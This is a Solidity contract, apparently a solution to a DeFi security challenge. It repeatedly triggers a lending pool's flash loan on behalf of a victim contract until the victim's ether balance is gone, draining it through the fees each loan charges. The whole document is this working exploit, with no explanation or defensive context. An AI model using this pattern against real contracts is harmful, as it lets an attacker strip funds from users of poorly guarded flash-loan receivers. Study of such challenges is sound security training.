pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract NaiveReceiverAttacker {
    using Address for address;

    address private pool;

    constructor(address poolAddress) public {
        pool = poolAddress;
    }

    function drain(address victim) public {
        while (victim.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    victim,
                    1 ether
                )
            );
            require(success, "NaiveReceiverAttacker: flashloan failed");
        }
    }
}
